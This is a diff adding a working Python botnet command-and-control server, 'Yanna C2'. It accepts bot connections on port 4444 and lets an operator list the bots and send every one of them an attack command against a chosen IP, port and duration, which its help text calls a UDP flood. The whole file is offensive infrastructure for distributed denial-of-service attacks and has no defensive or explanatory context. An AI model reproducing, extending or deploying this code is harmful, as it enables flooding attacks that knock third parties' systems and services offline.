@@ -1,0 +1,117 @@
+python
+import socket
+import threading
+import time
+
+# --- C2 Configuration ---
+HOST = '0.0.0.0'  # Listen on all network interfaces
+PORT = 4444      # The port for bots to connect to
+# ------------------------
+
+all_bots = []
+all_addresses = []
+
+def accept_connections(sock):
+    """
+    Accepts incoming connections from new bots and adds them to our list.
+    """
+    while True:
+        try:
+            conn, address = sock.accept()
+            sock.setblocking(1)  # Prevents timeout
+            
+            all_bots.append(conn)
+            all_addresses.append(address)
+            
+            print(f"\n[+] New connection established from: {address[0]}")
+            print(f"Total bots: {len(all_bots)}")
+            print(">> ", end="")
+
+        except socket.error as e:
+            print(f"[!] Error accepting connections: {e}")
+            time.sleep(0.5)
+
+def command_center():
+    """
+    The main command and control interface for the botmaster.
+    """
+    print("Yanna C2 Server Initialized.")
+    print(f"Listening for bots on port {PORT}...")
+    print("Type 'help' for a list of commands.")
+    
+    while True:
+        cmd = input(">> ")
+
+        if cmd == 'list':
+            print("\n--- Connected Bots ---")
+            if not all_bots:
+                print("No bots connected.")
+            else:
+                for i, conn in enumerate(all_bots):
+                    print(f"{i}: {all_addresses[i][0]}:{all_addresses[i][1]}")
+            print("----------------------")
+
+        elif 'attack' in cmd:
+            try:
+                # Command format: attack <ip> <port> <duration_seconds>
+                _, target_ip, target_port, duration = cmd.split()
+                target_port = int(target_port)
+                duration = int(duration)
+
+                command_to_send = f"attack {target_ip} {target_port} {duration}"
+                send_command_to_bots(command_to_send)
+                print(f"\n[+] Attack command sent to {len(all_bots)} bots.")
+                print(f"    Target: {target_ip}:{target_port}")
+                print(f"    Duration: {duration} seconds")
+
+            except ValueError:
+                print("[!] Invalid attack command.")
+                print("    Usage: attack <ip> <port> <duration_seconds>")
+            except Exception as e:
+                print(f"[!] An error occurred: {e}")
+
+        elif cmd == 'help':
+            print("\n--- C2 Commands ---")
+            print("list              - List all connected bots.")
+            print("attack <ip> <port> <duration> - Launch a UDP flood attack.")
+            print("-------------------")
+            
+        elif cmd == '':
+            pass
+
+        else:
+            print("[!] Unknown command. Type 'help' for options.")
+
+def send_command_to_bots(command):
+    """
+    Broadcasts a command to every connected bot.
+    """
+    disconnected_bots = []
+    for i, conn in enumerate(all_bots):
+        try:
+            conn.send(str.encode(command))
+        except (socket.error, BrokenPipeError):
+            disconnected_bots.append(i)
+
+    # Clean up disconnected bots
+    for i in sorted(disconnected_bots, reverse=True):
+        print(f"\n[-] Bot {all_addresses[i][0]} disconnected.")
+        del all_bots[i]
+        del all_addresses[i]
+
+
+def main():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind((HOST, PORT))
+    sock.listen(100) # Listen for up to 100 bots
+
+    # Thread for accepting new bot connections
+    accept_thread = threading.Thread(target=accept_connections, args=(sock,))
+    accept_thread.daemon = True
+    accept_thread.start()
+
+    # Main thread for command input
+    command_center()
+
+if __name__ == "__main__":
+    main()
